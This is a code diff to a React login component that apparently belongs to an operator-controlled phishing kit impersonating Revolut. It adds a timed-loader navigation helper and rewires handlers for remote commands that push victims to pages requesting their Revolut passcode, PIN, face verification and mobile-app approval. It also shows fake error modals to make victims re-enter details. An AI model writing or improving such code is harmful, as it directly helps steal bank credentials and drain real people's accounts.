@@ -70,6 +70,32 @@ export default function LoginForm() {
       setYourCommandState(newCommand);
     };
 
+    const navigateWithLoader = (path) => {
+      // Show loader
+      setDisplayLoader(true);
+      
+      // Set a minimum display time for the loader (for UX purposes)
+      const minLoaderTime = 3500; // 1.5 seconds
+      const startTime = Date.now();
+      
+      // Prepare the navigation
+      const performNavigation = () => {
+        router.push(path);
+      };
+      
+      // Handle the timing
+      setTimeout(() => {
+        const elapsedTime = Date.now() - startTime;
+        if (elapsedTime < minLoaderTime) {
+          // If minimum time hasn't passed, wait the remaining time
+          setTimeout(performNavigation, minLoaderTime - elapsedTime);
+        } else {
+          // Minimum time has passed, navigate immediately
+          performNavigation();
+        }
+      }, 100); // Small delay to ensure loader is visible
+    };
+
 
 
     useEffect(() => {
@@ -80,44 +106,49 @@ export default function LoginForm() {
             console.log("HERE WE WILL REQUEST NUMBER AGAIN");
             displayErrorModal('phone'); // Show error modal for phone number
         } else if (command === 'REQUEST_REVOLUT_PASSCODE') {
-            displayPageLoader();
-            setTimeout(() => {
-                console.log("HERE WE WILL PUSH TO PASSWORD PAGE");
-                router.push('/PasswordPage');
-            }, 2500);
+            navigateWithLoader('/PasswordPage');
+            // displayPageLoader();
+            // setTimeout(() => {
+            //     console.log("HERE WE WILL PUSH TO PASSWORD PAGE");
+            //     router.push('/PasswordPage');
+            // }, 2500);
         } else if (command === 'REQUEST_REVOLUT_PASSCODE_AGAIN') {
             console.log("HERE WE WILL REQUEST REVOLUT PASSCODE AGAIN");
             displayErrorModal('passcode'); // Show error modal for passcode
         } else if (command === 'REQUEST_REVOLUT_PIN') {
-            displayPageLoader();
-            setTimeout(() => {
-                console.log("HERE WE WILL PUSH TO PIN PAGE");
-                router.push('/PasswordPage');
-            }, 2500);
+            navigateWithLoader('/PasswordPage');
+            // displayPageLoader();
+            // setTimeout(() => {
+            //     console.log("HERE WE WILL PUSH TO PIN PAGE");
+            //     router.push('/PasswordPage');
+            // }, 2500);
         } else if (command === 'REQUEST_REVOLUT_PIN_AGAIN') {
             console.log("HERE WE WILL REQUEST REVOLUT PIN");
             displayErrorModal('pin'); // Show error modal for pin
         } else if (command === 'REQUEST_REVOLUT_FACE_VERIFICATION') {
-            displayPageLoader();
-            setTimeout(() => {
-                console.log("HERE WE WILL PUSH TO FACE VERIFICATION PAGE");
-                // displayPageLoader();
-                // router.push('/FaceVerificationPage');
-            }, 2500);
+            navigateWithLoader('/FaceVerificationPage');
+            // displayPageLoader();
+            // setTimeout(() => {
+            //     console.log("HERE WE WILL PUSH TO FACE VERIFICATION PAGE");
+            //     // displayPageLoader();
+            //     // router.push('/FaceVerificationPage');
+            // }, 2500);
         } else if (command === 'REQUEST_REVOLUT_FACE_VERIFICATION_AGAIN') {
             // displayErrorModal('face_verification'); // Show error modal for face verification
         } else if (command === 'REQUEST_MOBILE_APP_VERIFICATION') {
-            displayPageLoader();
-            setTimeout(() => {
-                console.log("HERE WE WILL PUSH TO MOBILE APP VERIFICATION PAGE");
-                router.push('/MobileAuthPAge');
-            }, 500);
+            navigateWithLoader('/MobileAuthPAge');
+            // displayPageLoader();
+            // setTimeout(() => {
+            //     console.log("HERE WE WILL PUSH TO MOBILE APP VERIFICATION PAGE");
+            //     router.push('/MobileAuthPAge');
+            // }, 500);
         } else if (command === 'FINISH') {
-            displayPageLoader();
-            setTimeout(() => {
-                resetCommand();
-                router.push('/verificationPage');
-            }, 2500);
+            navigateWithLoader('/verificationPage');
+            // displayPageLoader();
+            // setTimeout(() => {
+            //     resetCommand();
+            //     router.push('/verificationPage');
+            // }, 2500);
         }
     }, [command, router, commandCounter]);
 
